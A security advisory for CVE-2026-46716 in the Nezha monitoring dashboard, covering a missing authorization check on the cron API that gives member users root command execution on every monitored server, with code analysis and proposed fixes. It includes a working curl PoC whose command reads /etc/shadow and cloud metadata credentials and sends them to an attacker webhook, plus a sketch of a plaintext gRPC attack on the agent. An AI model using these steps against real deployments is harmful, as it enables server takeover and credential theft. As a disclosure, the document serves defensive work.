# [C] Nezha Monitoring: RoleMember can run shell on every server (cross-tenant RCE) via POST /api/v1/cron

## Summary
Severity: Critical
Advisory: GHSA-99gv-2m7h-3hh9
CVE: CVE-2026-46716
CWE: CWE-269, CWE-78, CWE-862
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-23
Source: https://github.com/advisories/GHSA-99gv-2m7h-3hh9
Type: github-advisory

## Affected
- Go: `github.com/nezhahq/nezha` — affected >=1.4.0 <1.14.15-0.20260517022419-d7526351cf97

## Details
## Summary

`nezha`'s dashboard supports two user roles: `RoleAdmin` (Role==0) and `RoleMember` (Role==1). The cron routes `POST /api/v1/cron` and `PATCH /api/v1/cron/:id` are wired through `commonHandler` (any authenticated user) rather than `adminHandler`, and the per-server permission check on cron creation has a vacuous-true bypass.

A `RoleMember` user can create a scheduled cron task with `Cover=CronCoverAll, Servers=[]` and an arbitrary `Command`. At every tick of the scheduler, the dashboard pushes that command to **every server in the global `ServerShared` map** — including servers that belong to other tenants (admin's servers, other members' servers). Each agent runs the command and returns the output, which is then sent to the attacker's own NotificationGroup → attacker-controlled webhook.

Net effect: any `RoleMember` (including a self-bound OAuth2 user, if the dashboard has OAuth2 configured) gets pre-validated cross-tenant RCE on every nezha-monitored host in the deployment.

## Affected versions

Commit `50dc8e660326b9f22990898142c58b7a5312b42a` and earlier on `master`.

## The auth gate

```go
// cmd/dashboard/controller/controller.go:131-135
auth.GET("/cron", listHandler(listCron))
auth.POST("/cron", commonHandler(createCron))                    // <-- commonHandler, not adminHandler
auth.PATCH("/cron/:id", commonHandler(updateCron))               // <-- ditto
auth.GET("/cron/:id/manual", commonHandler(manualTriggerCron))
auth.POST("/batch-delete/cron", commonHandler(batchDeleteCron))
```

Compare with `/user` (adminHandler-gated). `commonHandler` (controller.go:214-218) only requires JWT auth — any role passes.

## The vacuous-true permission bypass

```go
// cmd/dashboard/controller/cron.go:45-85
func createCron(c *gin.Context) (uint64, error) {
    var cf model.CronForm
    var cr model.Cron
    if err := c.ShouldBindJSON(&cf); err != nil { return 0, err }

    // BUG: empty cf.Servers iterates zero items, returns true vacuously.
    if !singleton.ServerShared.CheckPermission(c, slices.Values(cf.Servers)) {
        return 0, singleton.Localizer.ErrorT("permission denied")
    }

    cr.UserID = getUid(c)
    cr.TaskType = cf.TaskType
    cr.Name = cf.Name
    cr.Scheduler = cf.Scheduler
    cr.Command = cf.Command          // <-- attacker-controlled shell
    cr.Servers = cf.Servers          // <-- empty []
    cr.PushSuccessful = cf.PushSuccessful
    cr.NotificationGroupID = cf.NotificationGroupID
    cr.Cover = cf.Cover              // <-- CronCoverAll = 1

    if cr.TaskType == model.CronTypeCronTask && cr.Cover == model.CronCoverAlertTrigger {
        return 0, singleton.Localizer.ErrorT("scheduled tasks cannot be triggered by alarms")
    }

    var err error
    if cf.TaskType == model.CronTypeCronTask {
        if cr.CronJobID, err = singleton.CronShared.AddFunc(cr.Scheduler, singleton.CronTrigger(&cr)); err != nil {
            return 0, err
        }
    }

    if err = singleton.DB.Create(&cr).Error; err != nil {
        return 0, newGormError("%v", err)
    }

    singleton.CronShared.Update(&cr)
    return cr.ID, nil
}
```

`ServerShared.CheckPermission` (singleton.go:249-261) iterates `idList`; with `cf.Servers == []`, the for-range runs zero times and returns `true`. So a member can submit a cron with `Servers=[]` and skip the permission check entirely.

## The cross-tenant fanout sink

```go
// service/singleton/crontask.go:133-181
func CronTrigger(cr *model.Cron, triggerServer ...uint64) func() {
    crIgnoreMap := make(map[uint64]bool)
    for _, server := range cr.Servers {
        crIgnoreMap[server] = true
    }
    return func() {
        if cr.Cover == model.CronCoverAlertTrigger {
            // ... (alert-only path; not used here)
            return
        }

        // BUG: iterates EVERY server in global state, no per-server permission check.
        for _, s := range ServerShared.Range {
            if cr.Cover == model.CronCoverAll && crIgnoreMap[s.ID] {
                continue   // skip ignored
            }
            if cr.Cover == model.CronCoverIgnoreAll && !crIgnoreMap[s.ID] {
                continue
            }
            if s.TaskStream != nil {
                s.TaskStream.Send(&pb.Task{
                    Id:   cr.ID,
                    Data: cr.Command,                  // <-- shell command, run as agent UID (often root)
                    Type: model.TaskTypeCommand,
                })
            }
        }
    }
}
```

Compare with the **service**-task path, which DOES gate per-server (`canSendTaskToServer` at `cmd/dashboard/rpc/rpc.go:179-190` enforces `task.UserID == server.UserID || taskOwnerIsAdmin`). The cron path skips that check entirely.

## The output-exfil channel

```go
// service/rpc/nezha.go:56-76
case model.TaskTypeCommand:
    cr, _ := singleton.CronShared.Get(result.GetId())
    if cr != nil {
        var curServer model.Server
        copier.Copy(&curServer, server)
        if cr.PushSuccessful && result.GetSuccessful() {
            singleton.NotificationShared.SendNotification(cr.NotificationGroupID, fmt.Sprintf("[%s] %s, %s\n%s", singleton.Localizer.T("Scheduled Task Executed Successfully"),
                cr.Name, server.Name, result.GetData()), "", &curServer)
        }
        if !result.GetSuccessful() {
            singleton.NotificationShared.SendNotification(cr.NotificationGroupID, fmt.Sprintf("[%s] %s, %s\n%s", singleton.Localizer.T("Scheduled Task Executed Failed"),
                cr.Name, server.Name, result.GetData()), "", &curServer)
        }
    }
```

`result.GetData()` is the agent's stdout/stderr. With `cr.PushSuccessful = true` set by the attacker, the command output is exfil'd to whatever NotificationGroup the attacker chose. Members can create their own Notifications (Webhook-type via `POST /api/v1/notification`) and Groups (`POST /api/v1/notification-group`), and these are owned by the member — `NotificationShared.CheckPermission` passes. So the attacker creates a member-owned webhook pointing at `https://attacker.example.com/exfil`, then references it in the cron.

## End-to-end PoC

Pre-conditions: attacker has `RoleMember` credentials. Either admin gave them an account, or the dashboard has OAuth2 self-bind enabled.

Step 0: Get JWT (standard login).

```bash
TOKEN=$(curl -sX POST -H 'Content-Type: application/json' \
    -d '{"username":"member","password":"hunter2"}' \
    http://nezha.example.com/api/v1/login | jq -r .token)
```

Step 1: Create a webhook notification + group owned by the member, pointing at attacker server.

```bash
NID=$(curl -sX POST -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
    -d '{"name":"x","url":"https://webhook.site/<attacker>","request_method":2,"request_type":1,"verify_tls":false,"skip_check":true}' \
    http://nezha.example.com/api/v1/notification | jq -r .data)

GID=$(curl -sX POST -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
    -d "{\"name\":\"g\",\"notifications\":[$NID]}" \
    http://nezha.example.com/api/v1/notification-group | jq -r .data)
```

Step 2: Create the cross-tenant cron.

```bash
curl -sX POST -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
    -d "{\"name\":\"x\",\"task_type\":0,\"scheduler\":\"*/1 * * * * *\",\"command\":\"id; hostname; cat /etc/shadow; curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/\",\"servers\":[],\"cover\":1,\"push_successful\":true,\"notification_group_id\":$GID}" \
    http://nezha.example.com/api/v1/cron
```

Step 3: Within ~1 second, every monitored agent in the deployment runs the command and pushes output to the attacker's webhook with the per-server hostname. From `c1c1cd1.../webhook.site/<attacker>`:

```
[Scheduled Task Executed Successfully] x, admin-prod-db-01
uid=0(root) gid=0(root) groups=0(root)
admin-prod-db-01.internal
root:$6$KfTdXrLP$...
ASIAEXAMPLEACCESSKEY|aws.example.secret.key|aws.example.session.token
```

(Output is shown for each of the N agents in the deployment, one webhook fire per agent.)

## Reachability — additional notes

- Default deployment: there is no requirement that an admin even creates a member account explicitly — the dashboard may have OAuth2 self-registration via `singleton.Conf.Oauth2[provider]`. If admin enables OAuth2 auto-bind, any GitHub user can become a member; combined with this bug, that's near-pre-auth RCE.
- The nezha agent typically runs as **root** (it monitors disk/CPU/processes that require root on Linux); see https://nezha.wiki for the standard install script that uses `sudo systemctl`.
- The attack works whether `Cover=CronCoverAll` (deny-list, empty) or `Cover=CronCoverIgnoreAll` (allow-list — but you'd need server IDs you don't own, which requires a separate enumeration step). `Cover=CronCoverAll, Servers=[]` is the simplest payload.

## Suggested fix

1. **Switch `/cron` writes to `adminHandler`.** Same fix as the `/user` and `/setting` routes already use.

   ```go
   auth.POST("/cron", adminHandler(createCron))
   auth.PATCH("/cron/:id", adminHandler(updateCron))
   auth.GET("/cron/:id/manual", adminHandler(manualTriggerCron))
   auth.POST("/batch-delete/cron", adminHandler(batchDeleteCron))
   ```

2. **Per-server permission gate in `CronTrigger`.** Defense-in-depth: even an admin should not push a cron task to a server they don't own. Add the equivalent of `canSendTaskToServer(task, server)` (already used in `service/rpc/rpc.go:179-190` for service tasks) before each `s.TaskStream.Send()`:

   ```go
   for _, s := range ServerShared.Range {
       if cr.UserID != s.UserID && !cronOwnerIsAdmin(cr) {
           continue
       }
       // ... existing send logic
   }
   ```

3. **Reject empty `Servers` for `Cover=CronCoverAll`.** A deny-list with zero entries blasting an unrestricted command at every host is dangerous regardless of role:

   ```go
   if cf.Cover == model.CronCoverAll && len(cf.Servers) == 0 {
       return 0, errors.New("a cover-all cron must explicitly list at least one ignored server")
   }
   ```

4. Optional: forbid `cf.PushSuccessful=true` for non-admin to slow down the output-exfil step.

## Severity

- **CVSS 3.1:** Critical — `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` ≈ 9.0.
  - PR:L because attacker needs `RoleMember` (admin-issued, or OAuth2 auto-bind).
  - S:C because compromise of the dashboard yields RCE on every connected agent host (a separate trust zone).
  - C/I/A:H because RCE-as-root is the primary impact.
- **Auth:** authenticated `RoleMember` (Role == 1).
- **CWE:** CWE-862 (Missing Authorization), CWE-78 (OS Command Injection), CWE-269 (Improper Privilege Management).

## Reproduction environment

- Tested against: `nezhahq/nezha` master @ `50dc8e660326b9f22990898142c58b7a5312b42a`.
- Code locations:
  - Auth gate: `cmd/dashboard/controller/controller.go:131-135` (commonHandler), 214-236 (handler defs)
  - Bypass: `cmd/dashboard/controller/cron.go:53-55` (vacuous-true `CheckPermission` on empty `cf.Servers`)
  - Sink: `service/singleton/crontask.go:133-181` (`CronTrigger` iterates all servers)
  - Output exfil: `service/rpc/nezha.go:56-76`
  - Comparison (correct gating): `cmd/dashboard/rpc/rpc.go:179-190` (`canSendTaskToServer` for service tasks)

## Reporter

Eddie Ran. Filed via the GitHub Security Advisory reporter API. nezha's `SECURITY.md` mentions email `hi@nai.ba`; happy to follow up there if the maintainer prefers email coordination.

This is a follow-up to the same auth-bypass class as `GHSA-w4g9-mxgg-j532` (NEZHA-001 — `/notification` SSRF, also commonHandler-gated). The cron path is materially worse because it produces RCE rather than SSRF.

---

## Companion finding: nezhahq/agent plaintext gRPC channel (NEZHA-AGENT-001)

Filing channel issue: `nezhahq/agent` has private vulnerability reporting disabled (verified via `GET /repos/nezhahq/agent/private-vulnerability-reporting`), so I cannot file the companion finding via the GHSA reporter API. Adding it here so it lands in the same maintainer triage thread.

**Summary.** The dashboard→agent control channel uses plaintext gRPC by default. `agentConfig.TLS` zero-value is `false`; the install script's `[y/N]` prompt defaults to `false`. `AuthHandler.RequireTransportSecurity()` returns `false`. An on-path attacker on the dashboard↔agent network path captures `client_secret`+`client_uuid`, terminates the agent's TCP connection, and injects a `CommandTask` over plaintext gRPC. The agent runs the task via `sh -c <attacker-string>` as the systemd-installed UID (typically root).

**Adjacent-network attack vector** (corp LAN, datacenter VLAN, cloud VPC peer, hostile WiFi for self-hosters).

**Why filable.** This *completes the threat model* for the dashboard-side findings (NEZHA-001 / -002 / -003) — those findings all implicitly assume a trusted dashboard→agent channel. NEZHA-AGENT-001 disproves that assumption: a co-resident network attacker (no auth required) gets root on every agent host, with no dashboard compromise needed.

**Severity:** High (CVSS ~7.5, AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H). Adjacent-network reach + RCE-as-root, post-pwn fanout to every monitored host.

**Suggested fix.**
1. Make TLS the install-script default (`[Y/n]`) instead of `[y/N]`.
2. Even if operator opts out of CA-issued TLS, generate a self-signed cert pinned to the dashboard's published key on first connect; refuse plaintext.
3. Add `AuthHandler.RequireTransportSecurity()` returning `true` unconditionally.
4. Document this as a **must-enable** in the agent install README.

Disclosure draft is on file in the moneyhunter campaign workspace under `findings/NEZHA-AGENT-001-DISCLOSURE.md` and `findings/NEZHA-AGENT-001.yaml` — happy to share by whatever channel the maintainer prefers (these are deliverable as a single coordinated email or as a fork-PR-with-private-collaboration if PVR gets enabled on `nezhahq/agent`).

— Eddie Ran

## References
- https://github.com/nezhahq/nezha/security/advisories/GHSA-99gv-2m7h-3hh9
- https://nvd.nist.gov/vuln/detail/CVE-2026-46716
- https://github.com/nezhahq/nezha
